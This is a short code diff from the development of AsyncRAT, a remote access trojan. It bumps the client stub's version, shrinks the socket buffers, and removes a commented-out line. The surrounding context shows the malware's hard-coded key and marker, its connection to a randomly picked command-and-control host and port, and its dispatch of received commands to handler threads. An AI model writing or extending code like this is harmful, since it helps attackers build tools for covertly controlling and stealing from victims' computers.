@@ -63,7 +63,7 @@ Namespace AsyncRAT_Stub
         Public Shared ReadOnly SPL As String = "<<Async|RAT>>"
         Public Shared ReadOnly KEY As String = "<AsyncRAT123>"
         'Public Shared ReadOnly KEY As String = "%KEY%"
-        Public Shared ReadOnly VER As String = "v1.0D"
+        Public Shared ReadOnly VER As String = "v1.0E"
     End Class
 
 
@@ -86,8 +86,8 @@ Namespace AsyncRAT_Stub
                 Buffer = New Byte(0) {}
                 MS = New MemoryStream
 
-                S.ReceiveBufferSize = 1024 * 50
-                S.SendBufferSize = 1024 * 50
+                S.ReceiveBufferSize = 8192
+                S.SendBufferSize = 8192
 
                 S.Connect(Settings.Hosts.Item(New Random().Next(0, Settings.Hosts.Count)), Settings.Ports.Item(New Random().Next(0, Settings.Ports.Count)))
 
@@ -133,7 +133,6 @@ Namespace AsyncRAT_Stub
                     Else
                         MS.Write(Buffer, 0, Received)
                         If (MS.Length = BufferLength) Then
-                            'ThreadPool.QueueUserWorkItem(New WaitCallback(AddressOf BeginRead), MS.ToArray)
                             Dim T As New Thread(New ParameterizedThreadStart(AddressOf Messages.Read))
                             T.Start(MS.ToArray)
                             BufferLength = -1
